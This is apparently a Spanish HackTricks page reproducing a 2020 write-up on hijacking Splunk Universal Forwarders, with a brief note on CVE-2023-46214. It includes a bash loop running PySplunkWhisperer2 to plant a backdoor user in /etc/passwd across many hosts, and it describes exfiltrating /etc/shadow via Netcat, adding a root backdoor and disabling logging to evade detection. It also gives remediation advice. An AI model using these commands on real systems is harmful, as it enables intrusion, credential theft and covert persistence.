# Splunk LPE y Persistencia

<details>

<summary><strong>Aprende hacking en AWS de cero a héroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si quieres ver a tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF**, consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Consigue el [**merchandising oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colección de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **Únete al** 💬 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de Telegram**](https://t.me/peass) o **sígueme** en **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de GitHub de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

Si al **enumerar** una máquina **internamente** o **externamente** encuentras **Splunk en ejecución** (puerto 8090), y conoces alguna **credencial válida**, puedes **abusar del servicio Splunk** para **ejecutar una shell** como el usuario que ejecuta Splunk. Si lo ejecuta root, puedes escalar privilegios a root.

Además, si ya eres **root y el servicio Splunk no está escuchando solo en localhost**, puedes **robar** el archivo de **contraseñas** del servicio Splunk y **descifrar** las contraseñas o **agregar nuevas** credenciales. Y mantener persistencia en el host.

En la primera imagen a continuación puedes ver cómo luce una página web de Splunkd.

**La siguiente información fue copiada de** [**https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/**](https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/)

## Abusando de los Forwarders de Splunk para Shells y Persistencia

14 Ago 2020

### Descripción: <a href="#description" id="description"></a>

El Agente Universal Forwarder de Splunk (UF) permite a usuarios remotos autenticados enviar comandos individuales o scripts a los agentes a través de la API de Splunk. El agente UF no valida que las conexiones provengan de un servidor válido de Splunk Enterprise, ni valida que el código esté firmado o de alguna manera probado como proveniente del servidor Splunk Enterprise. Esto permite a un atacante que obtiene acceso a la contraseña del agente UF ejecutar código arbitrario en el servidor como SYSTEM o root, dependiendo del sistema operativo.

Este ataque está siendo utilizado por Pentesters y es probable que esté siendo explotado activamente en el mundo real por atacantes maliciosos. Obtener la contraseña podría llevar al compromiso de cientos de sistemas en un entorno de cliente.

Las contraseñas de Splunk UF son relativamente fáciles de adquirir, ver la sección Ubicaciones Comunes de Contraseñas para detalles.

### Contexto: <a href="#context" id="context"></a>

Splunk es una herramienta de agregación y búsqueda de datos a menudo utilizada como un sistema de Monitoreo de Información y Eventos de Seguridad (SIEM). Splunk Enterprise Server es una aplicación web que se ejecuta en un servidor, con agentes, llamados Universal Forwarders, que están instalados en cada sistema de la red. Splunk proporciona binarios de agente para Windows, Linux, Mac y Unix. Muchas organizaciones utilizan Syslog para enviar datos a Splunk en lugar de instalar un agente en hosts Linux/Unix, pero la instalación de agentes se está volviendo cada vez más popular.

El Universal Forwarder es accesible en cada host en https://host:8089. Acceder a cualquiera de las llamadas API protegidas, como /service/, muestra una caja de autenticación Básica. El nombre de usuario siempre es admin, y la contraseña por defecto solía ser changeme hasta 2016 cuando Splunk requirió que todas las nuevas instalaciones establecieran una contraseña de 8 caracteres o más. Como notarás en mi demostración, la complejidad no es un requisito ya que mi contraseña de agente es 12345678. Un atacante remoto puede forzar bruscamente la contraseña sin bloqueo, lo cual es una necesidad de un host de registro, ya que si la cuenta se bloqueara, entonces los registros ya no se enviarían al servidor Splunk y un atacante podría usar esto para ocultar sus ataques. La siguiente captura de pantalla muestra el agente Universal Forwarder, esta página inicial es accesible sin autenticación y se puede utilizar para enumerar hosts que ejecutan Splunk Universal Forwarder.

![0](https://eapolsniper.github.io/assets/2020AUG14/11\_SplunkAgent.png)

La documentación de Splunk muestra el uso de la misma contraseña de Universal Forwarding para todos los agentes, no recuerdo con seguridad si esto es un requisito o si se pueden establecer contraseñas individuales para cada agente, pero basado en la documentación y la memoria de cuando yo era administrador de Splunk, creo que todos los agentes deben usar la misma contraseña. Esto significa que si la contraseña se encuentra o se descifra en un sistema, es probable que funcione en todos los hosts de Splunk UF. Esta ha sido mi experiencia personal, permitiendo el compromiso rápido de cientos de hosts.

### Ubicaciones Comunes de Contraseñas <a href="#common-password-locations" id="common-password-locations"></a>

A menudo encuentro la contraseña en texto plano del agente Universal Forwarding de Splunk en las siguientes ubicaciones en redes:

1. Directorio Active Directory Sysvol/domain.com/Scripts. Los administradores almacenan el ejecutable y la contraseña juntos para una instalación eficiente del agente.
2. Comparticiones de archivos de red que alojan archivos de instalación de TI
3. Wikis u otros repositorios de notas de construcción en la red interna

La contraseña también se puede acceder en forma de hash en Program Files\Splunk\etc\passwd en hosts Windows, y en /opt/Splunk/etc/passwd en hosts Linux y Unix. Un atacante puede intentar descifrar la contraseña usando Hashcat, o alquilar un entorno de cracking en la nube para aumentar la probabilidad de descifrar el hash. La contraseña es un hash SHA-256 fuerte y, como tal, es poco probable que se descifre una contraseña fuerte y aleatoria.

### Impacto: <a href="#impact" id="impact"></a>

Un atacante con una contraseña de Splunk Universal Forward Agent puede comprometer completamente todos los hosts de Splunk en la red y obtener permisos de nivel SYSTEM o root en cada host. He utilizado con éxito el agente de Splunk en hosts Windows, Linux y Solaris Unix. Esta vulnerabilidad podría permitir que se volcaran credenciales del sistema, se exfiltraran datos sensibles o se instalara ransomware. Esta vulnerabilidad es rápida, fácil de usar y confiable.

Dado que Splunk maneja registros, un atacante podría reconfigurar el Universal Forwarder en el primer comando ejecutado para cambiar la ubicación del Forwarder, desactivando el registro en el SIEM de Splunk. Esto reduciría drásticamente las posibilidades de ser detectado por el equipo Blue del cliente.

El Universal Forwarder de Splunk a menudo se instala en Controladores de Dominio para la recolección de registros, lo que podría permitir fácilmente a un atacante extraer el archivo NTDS, desactivar el antivirus para una mayor explotación y/o modificar el dominio.

Finalmente, el Agente Universal Forwarding no requiere una licencia y se puede configurar con una contraseña de forma independiente. Como tal, un atacante puede instalar Universal Forwarder como un mecanismo de persistencia de puerta trasera en hosts, ya que es una aplicación legítima que los clientes, incluso aquellos que no usan Splunk, no es probable que eliminen.

### Evidencia: <a href="#evidence" id="evidence"></a>

Para mostrar un ejemplo de explotación, configuré un entorno de prueba utilizando la última versión de Splunk tanto para el Servidor Empresarial como para el agente Universal Forwarding. Se han adjuntado un total de 10 imágenes a este informe, mostrando lo siguiente:

1- Solicitando el archivo /etc/passwd a través de PySplunkWhisper2

![1](https://eapolsniper.github.io/assets/2020AUG14/1\_RequestingPasswd.png)

2- Recibiendo el archivo /etc/passwd en el sistema del atacante a través de Netcat

![2](https://eapolsniper.github.io/assets/2020AUG14/2\_ReceivingPasswd.png)

3- Solicitando el archivo /etc/shadow a través de PySplunkWhisper2

![3](https://eapolsniper.github.io/assets/2020AUG14/3\_RequestingShadow.png)

4- Recibiendo el archivo /etc/shadow en el sistema del atacante a través de Netcat

![4](https://eapolsniper.github.io/assets/2020AUG14/4\_ReceivingShadow.png)

5- Agregando el usuario attacker007 al archivo /etc/passwd

![5](https://eapolsniper.github.io/assets/2020AUG14/5\_AddingUserToPasswd.png)

6- Agregando el usuario attacker007 al archivo /etc/shadow

![6](https://eapolsniper.github.io/assets/2020AUG14/6\_AddingUserToShadow.png)

7- Recibiendo el nuevo archivo /etc/shadow mostrando que attacker007 se agregó con éxito

![7](https://eapolsniper.github.io/assets/2020AUG14/7\_ReceivingShadowFileAfterAdd.png)

8- Confirmando el acceso SSH a la víctima usando la cuenta de attacker007

![8](https://eapolsniper.github.io/assets/2020AUG14/8\_SSHAccessUsingAttacker007.png)

9- Agregando una cuenta root de puerta trasera con el nombre de usuario root007, con el uid/gid establecido en 0

![9](https://eapolsniper.github.io/assets/2020AUG14/9\_AddingBackdoorRootAccount.png)

10- Confirmando el acceso SSH usando attacker007, y luego escalando a root usando root007

![10](https://eapolsniper.github.io/assets/2020AUG14/10\_EscalatingToRoot.png)

En este punto tengo acceso persistente al host tanto a través de Splunk como a través de las dos cuentas de usuario creadas, una de las cuales proporciona root. Puedo desactivar el registro remoto para cubrir mis rastros y continuar atacando el sistema y la red utilizando este host.

Scripting PySplunkWhisperer2 es muy fácil y efectivo.

1. Crea un archivo con las IP de los hosts que quieres explotar, ejemplo de nombre ip.txt
2. Ejecuta lo siguiente:
```bash
for i in `cat ip.txt`; do python PySplunkWhisperer2_remote.py --host $i --port 8089 --username admin --password "12345678" --payload "echo 'attacker007:x:1003:1003::/home/:/bin/bash' >> /etc/passwd" --lhost 192.168.42.51;done
```
Información del host:

Servidor Splunk Enterprise: 192.168.42.114\
Agente Víctima del Splunk Forwarder: 192.168.42.98\
Atacante: 192.168.42.51

Versión de Splunk Enterprise: 8.0.5 (última a fecha de 12 de agosto de 2020 – día de configuración del laboratorio)\
Versión del Universal Forwarder: 8.0.5 (última a fecha de 12 de agosto de 2020 – día de configuración del laboratorio)

#### Recomendaciones de Remediación para Splunk, Inc: <a href="#remediation-recommendations-for-splunk-inc" id="remediation-recommendations-for-splunk-inc"></a>

Recomiendo implementar todas las siguientes soluciones para proporcionar defensa en profundidad:

1. Idealmente, el agente Universal Forwarder no tendría ningún puerto abierto, sino que sondearía al servidor Splunk a intervalos regulares para recibir instrucciones.
2. Habilitar la autenticación mutua TLS entre los clientes y el servidor, utilizando claves individuales para cada cliente. Esto proporcionaría una seguridad bidireccional muy alta entre todos los servicios de Splunk. La autenticación mutua TLS se está implementando ampliamente en agentes y dispositivos IoT, este es el futuro de la comunicación de cliente a servidor de dispositivos de confianza.
3. Enviar todo el código, archivos de una sola línea o scripts, en un archivo comprimido que esté cifrado y firmado por el servidor Splunk. Esto no protege los datos del agente enviados a través de la API, pero protege contra la Ejecución de Código Remoto maliciosa por parte de un tercero.

#### Recomendaciones de Remediación para clientes de Splunk: <a href="#remediation-recommendations-for-splunk-customers" id="remediation-recommendations-for-splunk-customers"></a>

1. Asegurar que se establezca una contraseña muy fuerte para los agentes de Splunk. Recomiendo al menos una contraseña aleatoria de 15 caracteres, pero dado que estas contraseñas nunca se escriben, se podría establecer una contraseña muy larga, como de 50 caracteres.
2. Configurar firewalls basados en el host para permitir conexiones al puerto 8089/TCP (puerto del Agente Universal Forwarder) solo desde el servidor Splunk.

### Recomendaciones para el Equipo Rojo: <a href="#recommendations-for-red-team" id="recommendations-for-red-team"></a>

1. Descargar una copia de Splunk Universal Forwarder para cada sistema operativo, ya que es un implante firmado y ligero excelente. Bueno tener una copia en caso de que Splunk realmente solucione esto.

### Exploits/Blogs de otros investigadores <a href="#exploitsblogs-from-other-researchers" id="exploitsblogs-from-other-researchers"></a>

Exploits públicos utilizables:

* https://github.com/cnotin/SplunkWhisperer2/tree/master/PySplunkWhisperer2
* https://www.exploit-db.com/exploits/46238
* https://www.exploit-db.com/exploits/46487

Publicaciones de blogs relacionadas:

* https://clement.notin.org/blog/2019/02/25/Splunk-Universal-Forwarder-Hijacking-2-SplunkWhisperer2/
* https://medium.com/@airman604/splunk-universal-forwarder-hijacking-5899c3e0e6b2
* https://www.hurricanelabs.com/splunk-tutorials/using-splunk-as-an-offensive-security-tool

_\*\* Nota: \*\*_ Este problema es un asunto serio con los sistemas de Splunk y ha sido explotado por otros probadores durante años. Aunque la Ejecución de Código Remoto es una característica intencionada de Splunk Universal Forwarder, la implementación de esto es peligrosa. Intenté enviar este bug a través del programa de recompensas por errores de Splunk con la muy improbable posibilidad de que no estuvieran al tanto de las implicaciones del diseño, pero me notificaron que cualquier envío de errores implementa la política de divulgación de Bug Crowd/Splunk que establece que no se pueden discutir detalles de la vulnerabilidad públicamente _nunca_ sin el permiso de Splunk. Solicité un plazo de divulgación de 90 días y fue denegado. Como tal, no divulgué esto de manera responsable ya que estoy razonablemente seguro de que Splunk está al tanto del problema y ha elegido ignorarlo, creo que esto podría afectar gravemente a las empresas, y es responsabilidad de la comunidad de infosec educar a las empresas.

## Abusando de Consultas Splunk

Información de [https://blog.hrncirik.net/cve-2023-46214-analysis](https://blog.hrncirik.net/cve-2023-46214-analysis)

El **CVE-2023-46214** permitía subir un script arbitrario a **`$SPLUNK_HOME/bin/scripts`** y luego explicaba que usando la consulta de búsqueda **`|runshellscript script_name.sh`** era posible **ejecutar** el **script** almacenado allí:

<figure><img src="../../.gitbook/assets/image (721).png" alt=""><figcaption></figcaption></figure>

<details>

<summary><strong>Aprende hacking en AWS de cero a héroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si quieres ver a tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Consigue el [**merchandising oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colección de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **Únete al** 💬 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sigue** a **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) en github.

</details>
